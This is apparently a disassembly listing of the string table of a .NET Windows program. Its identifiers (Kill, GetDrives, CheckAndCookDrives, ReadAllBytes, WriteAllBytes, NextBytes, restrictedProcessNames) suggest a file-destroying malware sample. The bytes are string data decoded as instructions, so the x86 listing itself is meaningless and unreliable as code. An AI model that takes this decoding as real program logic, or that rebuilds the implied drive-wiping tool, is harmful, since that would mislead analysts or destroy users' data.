   140003ba5:	6e                   	outsb  (%rsi),(%dx)
   140003ba6:	63 69 70             	movsxd 0x70(%rcx),%ebp
   140003ba9:	61                   	(bad)
   140003baa:	6c                   	insb   (%dx),(%rdi)
   140003bab:	00 4b 69             	add    %cl,0x69(%rbx)
   140003bae:	6c                   	insb   (%dx),(%rdi)
   140003baf:	6c                   	insb   (%dx),(%rdi)
   140003bb0:	00 50 72             	add    %dl,0x72(%rax)
   140003bb3:	6f                   	outsl  (%rsi),(%dx)
   140003bb4:	67 72 61             	addr32 jb 0x140003c18
   140003bb7:	6d                   	insl   (%dx),(%rdi)
   140003bb8:	00 43 68             	add    %al,0x68(%rbx)
   140003bbb:	65 63 6b 49          	movsxd %gs:0x49(%rbx),%ebp
   140003bbf:	66 41 6c             	data16 rex.B insb (%dx),(%rdi)
   140003bc2:	72 65                	jb     0x140003c29
   140003bc4:	61                   	(bad)
   140003bc5:	64 79 49             	fs jns 0x140003c11
   140003bc8:	6e                   	outsb  (%rsi),(%dx)
   140003bc9:	4d                   	rex.WRB
   140003bca:	65 6d                	gs insl (%dx),(%rdi)
   140003bcc:	00 53 79             	add    %dl,0x79(%rbx)
   140003bcf:	73 74                	jae    0x140003c45
   140003bd1:	65 6d                	gs insl (%dx),(%rdi)
   140003bd3:	00 52 61             	add    %dl,0x61(%rdx)
   140003bd6:	6e                   	outsb  (%rsi),(%dx)
   140003bd7:	64 6f                	outsl  %fs:(%rsi),(%dx)
   140003bd9:	6d                   	insl   (%dx),(%rdi)
   140003bda:	00 54 69 6d          	add    %dl,0x6d(%rcx,%rbp,2)
   140003bde:	65 53                	gs push %rbx
   140003be0:	70 61                	jo     0x140003c43
   140003be2:	6e                   	outsb  (%rsi),(%dx)
   140003be3:	00 4d 61             	add    %cl,0x61(%rbp)
   140003be6:	69 6e 00 4d 65 73 73 	imul   $0x7373654d,0x0(%rsi),%ebp
   140003bed:	61                   	(bad)
   140003bee:	67 65 42 6f          	rex.X outsl %gs:(%esi),(%dx)
   140003bf2:	78 49                	js     0x140003c3d
   140003bf4:	63 6f 6e             	movsxd 0x6e(%rdi),%ebp
   140003bf7:	00 47 65             	add    %al,0x65(%rdi)
   140003bfa:	74 46                	je     0x140003c42
   140003bfc:	69 6c 65 4e 61 6d 65 	imul   $0x57656d61,0x4e(%rbp,%riz,2),%ebp
   140003c03:	57 
   140003c04:	69 74 68 6f 75 74 45 	imul   $0x78457475,0x6f(%rax,%rbp,2),%esi
   140003c0b:	78 
   140003c0c:	74 65                	je     0x140003c73
   140003c0e:	6e                   	outsb  (%rsi),(%dx)
   140003c0f:	73 69                	jae    0x140003c7a
   140003c11:	6f                   	outsl  (%rsi),(%dx)
   140003c12:	6e                   	outsb  (%rsi),(%dx)
   140003c13:	00 67 65             	add    %ah,0x65(%rdi)
   140003c16:	74 5f                	je     0x140003c77
   140003c18:	4c 6f                	rex.WR outsl (%rsi),(%dx)
   140003c1a:	63 61 74             	movsxd 0x74(%rcx),%esp
   140003c1d:	69 6f 6e 00 53 79 73 	imul   $0x73795300,0x6e(%rdi),%ebp
   140003c24:	74 65                	je     0x140003c8b
   140003c26:	6d                   	insl   (%dx),(%rdi)
   140003c27:	2e 47 6c             	cs rex.RXB insb (%dx),(%rdi)
   140003c2a:	6f                   	outsl  (%rsi),(%dx)
   140003c2b:	62 61 6c 69 7a       	(bad)
   140003c30:	61                   	(bad)
   140003c31:	74 69                	je     0x140003c9c
   140003c33:	6f                   	outsl  (%rsi),(%dx)
   140003c34:	6e                   	outsb  (%rsi),(%dx)
   140003c35:	00 6f 70             	add    %ch,0x70(%rdi)
   140003c38:	5f                   	pop    %rdi
   140003c39:	53                   	push   %rbx
   140003c3a:	75 62                	jne    0x140003c9e
   140003c3c:	74 72                	je     0x140003cb0
   140003c3e:	61                   	(bad)
   140003c3f:	63 74 69 6f          	movsxd 0x6f(%rcx,%rbp,2),%esi
   140003c43:	6e                   	outsb  (%rsi),(%dx)
   140003c44:	00 53 79             	add    %dl,0x79(%rbx)
   140003c47:	73 74                	jae    0x140003cbd
   140003c49:	65 6d                	gs insl (%dx),(%rdi)
   140003c4b:	2e 52                	cs push %rdx
   140003c4d:	65 66 6c             	gs data16 insb (%dx),(%rdi)
   140003c50:	65 63 74 69 6f       	movsxd %gs:0x6f(%rcx,%rbp,2),%esi
   140003c55:	6e                   	outsb  (%rsi),(%dx)
   140003c56:	00 4e 6f             	add    %cl,0x6f(%rsi)
   140003c59:	74 53                	je     0x140003cae
   140003c5b:	75 70                	jne    0x140003ccd
   140003c5d:	70 6f                	jo     0x140003cce
   140003c5f:	72 74                	jb     0x140003cd5
   140003c61:	65 64 45 78 63       	gs fs rex.RB js 0x140003cc9
   140003c66:	65 70 74             	gs jo  0x140003cdd
   140003c69:	69 6f 6e 00 3c 3e 33 	imul   $0x333e3c00,0x6e(%rdi),%ebp
   140003c70:	5f                   	pop    %rdi
   140003c71:	5f                   	pop    %rdi
   140003c72:	73 65                	jae    0x140003cd9
   140003c74:	61                   	(bad)
   140003c75:	72 63                	jb     0x140003cda
   140003c77:	68 50 61 74 74       	push   $0x74746150
   140003c7c:	65 72 6e             	gs jb  0x140003ced
   140003c7f:	00 43 68             	add    %al,0x68(%rbx)
   140003c82:	65 63 6b 46          	movsxd %gs:0x46(%rbx),%ebp
   140003c86:	69 72 73 74 52 75 6e 	imul   $0x6e755274,0x73(%rdx),%esi
   140003c8d:	00 46 69             	add    %al,0x69(%rsi)
   140003c90:	6c                   	insb   (%dx),(%rdi)
   140003c91:	65 49 6e             	rex.WB outsb %gs:(%rsi),(%dx)
   140003c94:	66 6f                	outsw  (%rsi),(%dx)
   140003c96:	00 43 75             	add    %al,0x75(%rbx)
   140003c99:	6c                   	insb   (%dx),(%rdi)
   140003c9a:	74 75                	je     0x140003d11
   140003c9c:	72 65                	jb     0x140003d03
   140003c9e:	49 6e                	rex.WB outsb (%rsi),(%dx)
   140003ca0:	66 6f                	outsw  (%rsi),(%dx)
   140003ca2:	00 44 72 69          	add    %al,0x69(%rdx,%rsi,2)
   140003ca6:	76 65                	jbe    0x140003d0d
   140003ca8:	49 6e                	rex.WB outsb (%rsi),(%dx)
   140003caa:	66 6f                	outsw  (%rsi),(%dx)
   140003cac:	00 46 69             	add    %al,0x69(%rsi)
   140003caf:	6c                   	insb   (%dx),(%rdi)
   140003cb0:	65 53                	gs push %rbx
   140003cb2:	79 73                	jns    0x140003d27
   140003cb4:	74 65                	je     0x140003d1b
   140003cb6:	6d                   	insl   (%dx),(%rdi)
   140003cb7:	49 6e                	rex.WB outsb (%rsi),(%dx)
   140003cb9:	66 6f                	outsw  (%rsi),(%dx)
   140003cbb:	00 50 72             	add    %dl,0x72(%rax)
   140003cbe:	6f                   	outsl  (%rsi),(%dx)
   140003cbf:	63 65 73             	movsxd 0x73(%rbp),%esp
   140003cc2:	73 53                	jae    0x140003d17
   140003cc4:	74 61                	je     0x140003d27
   140003cc6:	72 74                	jb     0x140003d3c
   140003cc8:	49 6e                	rex.WB outsb (%rsi),(%dx)
   140003cca:	66 6f                	outsw  (%rsi),(%dx)
   140003ccc:	00 44 69 72          	add    %al,0x72(%rcx,%rbp,2)
   140003cd0:	65 63 74 6f 72       	movsxd %gs:0x72(%rdi,%rbp,2),%esi
   140003cd5:	79 49                	jns    0x140003d20
   140003cd7:	6e                   	outsb  (%rsi),(%dx)
   140003cd8:	66 6f                	outsw  (%rsi),(%dx)
   140003cda:	00 53 6c             	add    %dl,0x6c(%rbx)
   140003cdd:	65 65 70 00          	gs gs jo 0x140003ce1
   140003ce1:	50                   	push   %rax
   140003ce2:	6f                   	outsl  (%rsi),(%dx)
   140003ce3:	70 00                	jo     0x140003ce5
   140003ce5:	53                   	push   %rbx
   140003ce6:	79 73                	jns    0x140003d5b
   140003ce8:	74 65                	je     0x140003d4f
   140003cea:	6d                   	insl   (%dx),(%rdi)
   140003ceb:	2e 4c 69 6e 71 00 43 	cs imul $0x61684300,0x71(%rsi),%r13
   140003cf2:	68 61 
   140003cf4:	72 00                	jb     0x140003cf6
   140003cf6:	68 65 61 64 65       	push   $0x65646165
   140003cfb:	72 00                	jb     0x140003cfd
   140003cfd:	49                   	rex.WB
   140003cfe:	46 6f                	rex.RX outsl (%rsi),(%dx)
   140003d00:	72 6d                	jb     0x140003d6f
   140003d02:	61                   	(bad)
   140003d03:	74 50                	je     0x140003d55
   140003d05:	72 6f                	jb     0x140003d76
   140003d07:	76 69                	jbe    0x140003d72
   140003d09:	64 65 72 00          	fs gs jb 0x140003d0d
   140003d0d:	53                   	push   %rbx
   140003d0e:	70 65                	jo     0x140003d75
   140003d10:	63 69 61             	movsxd 0x61(%rcx),%ebp
   140003d13:	6c                   	insb   (%dx),(%rdi)
   140003d14:	46 6f                	rex.RX outsl (%rsi),(%dx)
   140003d16:	6c                   	insb   (%dx),(%rdi)
   140003d17:	64 65 72 00          	fs gs jb 0x140003d1b
   140003d1b:	43 75 72             	rex.XB jne 0x140003d90
   140003d1e:	72 65                	jb     0x140003d85
   140003d20:	6e                   	outsb  (%rsi),(%dx)
   140003d21:	74 55                	je     0x140003d78
   140003d23:	73 65                	jae    0x140003d8a
   140003d25:	72 00                	jb     0x140003d27
   140003d27:	43 6f                	rex.XB outsl (%rsi),(%dx)
   140003d29:	6e                   	outsb  (%rsi),(%dx)
   140003d2a:	73 6f                	jae    0x140003d9b
   140003d2c:	6c                   	insb   (%dx),(%rdi)
   140003d2d:	65 43 6f             	rex.XB outsl %gs:(%rsi),(%dx)
   140003d30:	6c                   	insb   (%dx),(%rdi)
   140003d31:	6f                   	outsl  (%rsi),(%dx)
   140003d32:	72 00                	jb     0x140003d34
   140003d34:	63 6f 6c             	movsxd 0x6c(%rdi),%ebp
   140003d37:	6f                   	outsl  (%rsi),(%dx)
   140003d38:	72 00                	jb     0x140003d3a
   140003d3a:	49                   	rex.WB
   140003d3b:	45 6e                	rex.RB outsb (%rsi),(%dx)
   140003d3d:	75 6d                	jne    0x140003dac
   140003d3f:	65 72 61             	gs jb  0x140003da3
   140003d42:	74 6f                	je     0x140003db3
   140003d44:	72 00                	jb     0x140003d46
   140003d46:	53                   	push   %rbx
   140003d47:	79 73                	jns    0x140003dbc
   140003d49:	74 65                	je     0x140003db0
   140003d4b:	6d                   	insl   (%dx),(%rdi)
   140003d4c:	2e 43 6f             	cs rex.XB outsl (%rsi),(%dx)
   140003d4f:	6c                   	insb   (%dx),(%rdi)
   140003d50:	6c                   	insb   (%dx),(%rdi)
   140003d51:	65 63 74 69 6f       	movsxd %gs:0x6f(%rcx,%rbp,2),%esi
   140003d56:	6e                   	outsb  (%rsi),(%dx)
   140003d57:	73 2e                	jae    0x140003d87
   140003d59:	47                   	rex.RXB
   140003d5a:	65 6e                	outsb  %gs:(%rsi),(%dx)
   140003d5c:	65 72 69             	gs jb  0x140003dc8
   140003d5f:	63 2e                	movsxd (%rsi),%ebp
   140003d61:	49                   	rex.WB
   140003d62:	45 6e                	rex.RB outsb (%rsi),(%dx)
   140003d64:	75 6d                	jne    0x140003dd3
   140003d66:	65 72 61             	gs jb  0x140003dca
   140003d69:	62 6c 65 3c 53       	(bad)
   140003d6e:	79 73                	jns    0x140003de3
   140003d70:	74 65                	je     0x140003dd7
   140003d72:	6d                   	insl   (%dx),(%rdi)
   140003d73:	2e 53                	cs push %rbx
   140003d75:	74 72                	je     0x140003de9
   140003d77:	69 6e 67 3e 2e 47 65 	imul   $0x65472e3e,0x67(%rsi),%ebp
   140003d7e:	74 45                	je     0x140003dc5
   140003d80:	6e                   	outsb  (%rsi),(%dx)
   140003d81:	75 6d                	jne    0x140003df0
   140003d83:	65 72 61             	gs jb  0x140003de7
   140003d86:	74 6f                	je     0x140003df7
   140003d88:	72 00                	jb     0x140003d8a
   140003d8a:	53                   	push   %rbx
   140003d8b:	79 73                	jns    0x140003e00
   140003d8d:	74 65                	je     0x140003df4
   140003d8f:	6d                   	insl   (%dx),(%rdi)
   140003d90:	2e 43 6f             	cs rex.XB outsl (%rsi),(%dx)
   140003d93:	6c                   	insb   (%dx),(%rdi)
   140003d94:	6c                   	insb   (%dx),(%rdi)
   140003d95:	65 63 74 69 6f       	movsxd %gs:0x6f(%rcx,%rbp,2),%esi
   140003d9a:	6e                   	outsb  (%rsi),(%dx)
   140003d9b:	73 2e                	jae    0x140003dcb
   140003d9d:	49                   	rex.WB
   140003d9e:	45 6e                	rex.RB outsb (%rsi),(%dx)
   140003da0:	75 6d                	jne    0x140003e0f
   140003da2:	65 72 61             	gs jb  0x140003e06
   140003da5:	62 6c 65 2e 47       	(bad)
   140003daa:	65 74 45             	gs je  0x140003df2
   140003dad:	6e                   	outsb  (%rsi),(%dx)
   140003dae:	75 6d                	jne    0x140003e1d
   140003db0:	65 72 61             	gs jb  0x140003e14
   140003db3:	74 6f                	je     0x140003e24
   140003db5:	72 00                	jb     0x140003db7
   140003db7:	2e 63 74 6f 72       	cs movsxd 0x72(%rdi,%rbp,2),%esi
   140003dbc:	00 2e                	add    %ch,(%rsi)
   140003dbe:	63 63 74             	movsxd 0x74(%rbx),%esp
   140003dc1:	6f                   	outsl  (%rsi),(%dx)
   140003dc2:	72 00                	jb     0x140003dc4
   140003dc4:	53                   	push   %rbx
   140003dc5:	79 73                	jns    0x140003e3a
   140003dc7:	74 65                	je     0x140003e2e
   140003dc9:	6d                   	insl   (%dx),(%rdi)
   140003dca:	2e 44 69 61 67 6e 6f 	cs imul $0x74736f6e,0x67(%rcx),%r12d
   140003dd1:	73 74 
   140003dd3:	69 63 73 00 53 79 73 	imul   $0x73795300,0x73(%rbx),%esp
   140003dda:	74 65                	je     0x140003e41
   140003ddc:	6d                   	insl   (%dx),(%rdi)
   140003ddd:	2e 52                	cs push %rdx
   140003ddf:	75 6e                	jne    0x140003e4f
   140003de1:	74 69                	je     0x140003e4c
   140003de3:	6d                   	insl   (%dx),(%rdi)
   140003de4:	65 2e 49 6e          	gs rex.WB outsb %gs:(%rsi),(%dx)
   140003de8:	74 65                	je     0x140003e4f
   140003dea:	72 6f                	jb     0x140003e5b
   140003dec:	70 53                	jo     0x140003e41
   140003dee:	65 72 76             	gs jb  0x140003e67
   140003df1:	69 63 65 73 00 53 79 	imul   $0x79530073,0x65(%rbx),%esp
   140003df8:	73 74                	jae    0x140003e6e
   140003dfa:	65 6d                	gs insl (%dx),(%rdi)
   140003dfc:	2e 52                	cs push %rdx
   140003dfe:	75 6e                	jne    0x140003e6e
   140003e00:	74 69                	je     0x140003e6b
   140003e02:	6d                   	insl   (%dx),(%rdi)
   140003e03:	65 2e 43 6f          	gs rex.XB outsl %gs:(%rsi),(%dx)
   140003e07:	6d                   	insl   (%dx),(%rdi)
   140003e08:	70 69                	jo     0x140003e73
   140003e0a:	6c                   	insb   (%dx),(%rdi)
   140003e0b:	65 72 53             	gs jb  0x140003e61
   140003e0e:	65 72 76             	gs jb  0x140003e87
   140003e11:	69 63 65 73 00 44 65 	imul   $0x65440073,0x65(%rbx),%esp
   140003e18:	62 75 67 67 69       	(bad)
   140003e1d:	6e                   	outsb  (%rsi),(%dx)
   140003e1e:	67 4d 6f             	rex.WRB outsl (%esi),(%dx)
   140003e21:	64 65 73 00          	fs gs jae 0x140003e25
   140003e25:	47                   	rex.RXB
   140003e26:	65 74 44             	gs je  0x140003e6d
   140003e29:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%rdx),%esi
   140003e30:	69 65 73 00 47 65 74 	imul   $0x74654700,0x73(%rbp),%esp
   140003e37:	46 69 6c 65 73 00 47 	imul   $0x74654700,0x73(%rbp,%r12,2),%r13d
   140003e3e:	65 74 
   140003e40:	52                   	push   %rdx
   140003e41:	65 73 74             	gs jae 0x140003eb8
   140003e44:	72 69                	jb     0x140003eaf
   140003e46:	63 74 65 64          	movsxd 0x64(%rbp,%riz,2),%esi
   140003e4a:	4e 61                	rex.WRX (bad)
   140003e4c:	6d                   	insl   (%dx),(%rdi)
   140003e4d:	65 73 00             	gs jae 0x140003e50
   140003e50:	72 65                	jb     0x140003eb7
   140003e52:	73 74                	jae    0x140003ec8
   140003e54:	72 69                	jb     0x140003ebf
   140003e56:	63 74 65 64          	movsxd 0x64(%rbp,%riz,2),%esi
   140003e5a:	50                   	push   %rax
   140003e5b:	72 6f                	jb     0x140003ecc
   140003e5d:	63 65 73             	movsxd 0x73(%rbp),%esp
   140003e60:	73 4e                	jae    0x140003eb0
   140003e62:	61                   	(bad)
   140003e63:	6d                   	insl   (%dx),(%rdi)
   140003e64:	65 73 00             	gs jae 0x140003e67
   140003e67:	47                   	rex.RXB
   140003e68:	65 74 50             	gs je  0x140003ebb
   140003e6b:	72 6f                	jb     0x140003edc
   140003e6d:	63 65 73             	movsxd 0x73(%rbp),%esp
   140003e70:	73 65                	jae    0x140003ed7
   140003e72:	73 00                	jae    0x140003e74
   140003e74:	70 72                	jo     0x140003ee8
   140003e76:	6f                   	outsl  (%rsi),(%dx)
   140003e77:	63 65 73             	movsxd 0x73(%rbp),%esp
   140003e7a:	73 65                	jae    0x140003ee1
   140003e7c:	73 00                	jae    0x140003e7e
   140003e7e:	46 69 6c 65 41 74 74 	imul   $0x69727474,0x41(%rbp,%r12,2),%r13d
   140003e85:	72 69 
   140003e87:	62 75 74 65 73       	(bad)
   140003e8c:	00 47 65             	add    %al,0x65(%rdi)
   140003e8f:	74 41                	je     0x140003ed2
   140003e91:	74 74                	je     0x140003f07
   140003e93:	72 69                	jb     0x140003efe
   140003e95:	62 75 74 65 73       	(bad)
   140003e9a:	00 53 65             	add    %dl,0x65(%rbx)
   140003e9d:	74 41                	je     0x140003ee0
   140003e9f:	74 74                	je     0x140003f15
   140003ea1:	72 69                	jb     0x140003f0c
   140003ea3:	62 75 74 65 73       	(bad)
   140003ea8:	00 52 65             	add    %dl,0x65(%rdx)
   140003eab:	61                   	(bad)
   140003eac:	64 41 6c             	fs rex.B insb (%dx),(%rdi)
   140003eaf:	6c                   	insb   (%dx),(%rdi)
   140003eb0:	42 79 74             	rex.X jns 0x140003f27
   140003eb3:	65 73 00             	gs jae 0x140003eb6
   140003eb6:	57                   	push   %rdi
   140003eb7:	72 69                	jb     0x140003f22
   140003eb9:	74 65                	je     0x140003f20
   140003ebb:	41 6c                	rex.B insb (%dx),(%rdi)
   140003ebd:	6c                   	insb   (%dx),(%rdi)
   140003ebe:	42 79 74             	rex.X jns 0x140003f35
   140003ec1:	65 73 00             	gs jae 0x140003ec4
   140003ec4:	4e                   	rex.WRX
   140003ec5:	65 78 74             	gs js  0x140003f3c
   140003ec8:	42 79 74             	rex.X jns 0x140003f3f
   140003ecb:	65 73 00             	gs jae 0x140003ece
   140003ece:	43 68 65 63 6b 41    	rex.XB push $0x416b6365
   140003ed4:	6e                   	outsb  (%rsi),(%dx)
   140003ed5:	64 43 6f             	rex.XB outsl %fs:(%rsi),(%dx)
   140003ed8:	6f                   	outsl  (%rsi),(%dx)
   140003ed9:	6b 44 72 69 76       	imul   $0x76,0x69(%rdx,%rsi,2),%eax
   140003ede:	65 73 00             	gs jae 0x140003ee1
   140003ee1:	47                   	rex.RXB
   140003ee2:	65 74 44             	gs je  0x140003f29
   140003ee5:	72 69                	jb     0x140003f50
   140003ee7:	76 65                	jbe    0x140003f4e
   140003ee9:	73 00                	jae    0x140003eeb
   140003eeb:	61                   	(bad)
   140003eec:	72 67                	jb     0x140003f55
   140003eee:	73 00                	jae    0x140003ef0
   140003ef0:	53                   	push   %rbx
   140003ef1:	79 73                	jns    0x140003f66
   140003ef3:	74 65                	je     0x140003f5a
   140003ef5:	6d                   	insl   (%dx),(%rdi)
   140003ef6:	2e 57                	cs push %rdi
   140003ef8:	69 6e 64 6f 77 73 2e 	imul   $0x2e73776f,0x64(%rsi),%ebp
   140003eff:	46 6f                	rex.RX outsl (%rsi),(%dx)
   140003f01:	72 6d                	jb     0x140003f70
   140003f03:	73 00                	jae    0x140003f05
   140003f05:	43 6f                	rex.XB outsl (%rsi),(%dx)
   140003f07:	6e                   	outsb  (%rsi),(%dx)
   140003f08:	74 61                	je     0x140003f6b
   140003f0a:	69 6e 73 00 53 79 73 	imul   $0x73795300,0x73(%rsi),%ebp
   140003f11:	74 65                	je     0x140003f78
   140003f13:	6d                   	insl   (%dx),(%rdi)
   140003f14:	2e 43 6f             	cs rex.XB outsl (%rsi),(%dx)
   140003f17:	6c                   	insb   (%dx),(%rdi)
   140003f18:	6c                   	insb   (%dx),(%rdi)
   140003f19:	65 63 74 69 6f       	movsxd %gs:0x6f(%rcx,%rbp,2),%esi
   140003f1e:	6e                   	outsb  (%rsi),(%dx)
   140003f1f:	73 00                	jae    0x140003f21
   140003f21:	4d                   	rex.WRB
   140003f22:	65 73 73             	gs jae 0x140003f98
   140003f25:	61                   	(bad)
   140003f26:	67 65 42 6f          	rex.X outsl %gs:(%esi),(%dx)
   140003f2a:	78 42                	js     0x140003f6e
   140003f2c:	75 74                	jne    0x140003fa2
   140003f2e:	74 6f                	je     0x140003f9f
   140003f30:	6e                   	outsb  (%rsi),(%dx)
   140003f31:	73 00                	jae    0x140003f33
   140003f33:	67 65 74 5f          	addr32 gs je 0x140003f96
   140003f37:	43 68 61 72 73 00    	rex.XB push $0x737261
   140003f3d:	50                   	push   %rax
   140003f3e:	72 6f                	jb     0x140003faf
   140003f40:	63 65 73             	movsxd 0x73(%rbp),%esp
   140003f43:	73 00                	jae    0x140003f45
   140003f45:	45 78 69             	rex.RB js 0x140003fb1
   140003f48:	73 74                	jae    0x140003fbe
   140003f4a:	73 00                	jae    0x140003f4c
   140003f4c:	67 65 74 5f          	addr32 gs je 0x140003faf
   140003f50:	54                   	push   %rsp
   140003f51:	6f                   	outsl  (%rsi),(%dx)
   140003f52:	74 61                	je     0x140003fb5
   140003f54:	6c                   	insb   (%dx),(%rdi)
   140003f55:	44 61                	rex.R (bad)
   140003f57:	79 73                	jns    0x140003fcc
   140003f59:	00 43 6f             	add    %al,0x6f(%rbx)
   140003f5c:	6e                   	outsb  (%rsi),(%dx)
   140003f5d:	63 61 74             	movsxd 0x74(%rcx),%esp
   140003f60:	00 50 61             	add    %dl,0x61(%rax)
   140003f63:	72 73                	jb     0x140003fd8
   140003f65:	65 45 78 61          	gs rex.RB js 0x140003fca
   140003f69:	63 74 00 4f          	movsxd 0x4f(%rax,%rax,1),%esi
   140003f6d:	62 6a 65 63 74       	(bad)
   140003f72:	00 53 79             	add    %dl,0x79(%rbx)
   140003f75:	73 74                	jae    0x140003feb
   140003f77:	65 6d                	gs insl (%dx),(%rdi)
   140003f79:	2e 43 6f             	cs rex.XB outsl (%rsi),(%dx)
   140003f7c:	6c                   	insb   (%dx),(%rdi)
   140003f7d:	6c                   	insb   (%dx),(%rdi)
   140003f7e:	65 63 74 69 6f       	movsxd %gs:0x6f(%rcx,%rbp,2),%esi
   140003f83:	6e                   	outsb  (%rsi),(%dx)
   140003f84:	73 2e                	jae    0x140003fb4
   140003f86:	49                   	rex.WB
   140003f87:	45 6e                	rex.RB outsb (%rsi),(%dx)
   140003f89:	75 6d                	jne    0x140003ff8
   140003f8b:	65 72 61             	gs jb  0x140003fef
   140003f8e:	74 6f                	je     0x140003fff
   140003f90:	72 2e                	jb     0x140003fc0
   140003f92:	52                   	push   %rdx
   140003f93:	65 73 65             	gs jae 0x140003ffb
   140003f96:	74 00                	je     0x140003f98
   140003f98:	53                   	push   %rbx
   140003f99:	70 6c                	jo     0x140004007
   140003f9b:	69 74 00 45 78 69 74 	imul   $0x746978,0x45(%rax,%rax,1),%esi
   140003fa2:	00 
   140003fa3:	44 69 61 6c 6f 67 52 	imul   $0x6552676f,0x6c(%rcx),%r12d
   140003faa:	65 
   140003fab:	73 75                	jae    0x140004022
   140003fad:	6c                   	insb   (%dx),(%rdi)
   140003fae:	74 00                	je     0x140003fb0
   140003fb0:	45 6e                	rex.RB outsb (%rsi),(%dx)
   140003fb2:	76 69                	jbe    0x14000401d
   140003fb4:	72 6f                	jb     0x140004025
   140003fb6:	6e                   	outsb  (%rsi),(%dx)
   140003fb7:	6d                   	insl   (%dx),(%rdi)
   140003fb8:	65 6e                	outsb  %gs:(%rsi),(%dx)
   140003fba:	74 00                	je     0x140003fbc
   140003fbc:	53                   	push   %rbx
   140003fbd:	79 73                	jns    0x140004032
   140003fbf:	74 65                	je     0x140004026
   140003fc1:	6d                   	insl   (%dx),(%rdi)
   140003fc2:	2e 43 6f             	cs rex.XB outsl (%rsi),(%dx)
   140003fc5:	6c                   	insb   (%dx),(%rdi)
   140003fc6:	6c                   	insb   (%dx),(%rdi)
   140003fc7:	65 63 74 69 6f       	movsxd %gs:0x6f(%rcx,%rbp,2),%esi
   140003fcc:	6e                   	outsb  (%rsi),(%dx)
   140003fcd:	73 2e                	jae    0x140003ffd
   140003fcf:	47                   	rex.RXB
   140003fd0:	65 6e                	outsb  %gs:(%rsi),(%dx)
   140003fd2:	65 72 69             	gs jb  0x14000403e
   140003fd5:	63 2e                	movsxd (%rsi),%ebp
   140003fd7:	49                   	rex.WB
   140003fd8:	45 6e                	rex.RB outsb (%rsi),(%dx)
   140003fda:	75 6d                	jne    0x140004049
   140003fdc:	65 72 61             	gs jb  0x140004040
   140003fdf:	74 6f                	je     0x140004050
   140003fe1:	72 3c                	jb     0x14000401f
   140003fe3:	53                   	push   %rbx
   140003fe4:	79 73                	jns    0x140004059
   140003fe6:	74 65                	je     0x14000404d
   140003fe8:	6d                   	insl   (%dx),(%rdi)
   140003fe9:	2e 53                	cs push %rbx
   140003feb:	74 72                	je     0x14000405f
   140003fed:	69 6e 67 3e 2e 43 75 	imul   $0x75432e3e,0x67(%rsi),%ebp
   140003ff4:	72 72                	jb     0x140004068
   140003ff6:	65 6e                	outsb  %gs:(%rsi),(%dx)
   140003ff8:	74 00                	je     0x140003ffa
   140003ffa:	53                   	push   %rbx
   140003ffb:	79 73                	jns    0x140004070
   140003ffd:	74 65                	je     0x140004064
   140003fff:	6d                   	insl   (%dx),(%rdi)
   140004000:	2e 43 6f             	cs rex.XB outsl (%rsi),(%dx)
   140004003:	6c                   	insb   (%dx),(%rdi)
   140004004:	6c                   	insb   (%dx),(%rdi)
   140004005:	65 63 74 69 6f       	movsxd %gs:0x6f(%rcx,%rbp,2),%esi
   14000400a:	6e                   	outsb  (%rsi),(%dx)
   14000400b:	73 2e                	jae    0x14000403b
   14000400d:	49                   	rex.WB
   14000400e:	45 6e                	rex.RB outsb (%rsi),(%dx)
   140004010:	75 6d                	jne    0x14000407f
   140004012:	65 72 61             	gs jb  0x140004076
   140004015:	74 6f                	je     0x140004086
   140004017:	72 2e                	jb     0x140004047
   140004019:	43 75 72             	rex.XB jne 0x14000408e
   14000401c:	72 65                	jb     0x140004083
   14000401e:	6e                   	outsb  (%rsi),(%dx)
   14000401f:	74 00                	je     0x140004021
   140004021:	53                   	push   %rbx
   140004022:	79 73                	jns    0x140004097
   140004024:	74 65                	je     0x14000408b
   140004026:	6d                   	insl   (%dx),(%rdi)
   140004027:	2e 43 6f             	cs rex.XB outsl (%rsi),(%dx)
   14000402a:	6c                   	insb   (%dx),(%rdi)
   14000402b:	6c                   	insb   (%dx),(%rdi)
   14000402c:	65 63 74 69 6f       	movsxd %gs:0x6f(%rcx,%rbp,2),%esi
   140004031:	6e                   	outsb  (%rsi),(%dx)
   140004032:	73 2e                	jae    0x140004062
   140004034:	47                   	rex.RXB
   140004035:	65 6e                	outsb  %gs:(%rsi),(%dx)
   140004037:	65 72 69             	gs jb  0x1400040a3
   14000403a:	63 2e                	movsxd (%rsi),%ebp
   14000403c:	49                   	rex.WB
   14000403d:	45 6e                	rex.RB outsb (%rsi),(%dx)
   14000403f:	75 6d                	jne    0x1400040ae
   140004041:	65 72 61             	gs jb  0x1400040a5
   140004044:	74 6f                	je     0x1400040b5
   140004046:	72 3c                	jb     0x140004084
   140004048:	53                   	push   %rbx
   140004049:	79 73                	jns    0x1400040be
   14000404b:	74 65                	je     0x1400040b2
   14000404d:	6d                   	insl   (%dx),(%rdi)
   14000404e:	2e 53                	cs push %rbx
   140004050:	74 72                	je     0x1400040c4
   140004052:	69 6e 67 3e 2e 67 65 	imul   $0x65672e3e,0x67(%rsi),%ebp
   140004059:	74 5f                	je     0x1400040ba
   14000405b:	43 75 72             	rex.XB jne 0x1400040d0
   14000405e:	72 65                	jb     0x1400040c5
   140004060:	6e                   	outsb  (%rsi),(%dx)
   140004061:	74 00                	je     0x140004063
   140004063:	53                   	push   %rbx
   140004064:	79 73                	jns    0x1400040d9
   140004066:	74 65                	je     0x1400040cd
   140004068:	6d                   	insl   (%dx),(%rdi)
   140004069:	2e 43 6f             	cs rex.XB outsl (%rsi),(%dx)
   14000406c:	6c                   	insb   (%dx),(%rdi)
   14000406d:	6c                   	insb   (%dx),(%rdi)
   14000406e:	65 63 74 69 6f       	movsxd %gs:0x6f(%rcx,%rbp,2),%esi
   140004073:	6e                   	outsb  (%rsi),(%dx)
   140004074:	73 2e                	jae    0x1400040a4
   140004076:	49                   	rex.WB
   140004077:	45 6e                	rex.RB outsb (%rsi),(%dx)
   140004079:	75 6d                	jne    0x1400040e8
   14000407b:	65 72 61             	gs jb  0x1400040df
   14000407e:	74 6f                	je     0x1400040ef
   140004080:	72 2e                	jb     0x1400040b0
   140004082:	67 65 74 5f          	addr32 gs je 0x1400040e5
   140004086:	43 75 72             	rex.XB jne 0x1400040fb
   140004089:	72 65                	jb     0x1400040f0
   14000408b:	6e                   	outsb  (%rsi),(%dx)
   14000408c:	74 00                	je     0x14000408e
   14000408e:	47                   	rex.RXB
   14000408f:	65 74 43             	gs je  0x1400040d5
   140004092:	75 72                	jne    0x140004106
   140004094:	72 65                	jb     0x1400040fb
   140004096:	6e                   	outsb  (%rsi),(%dx)
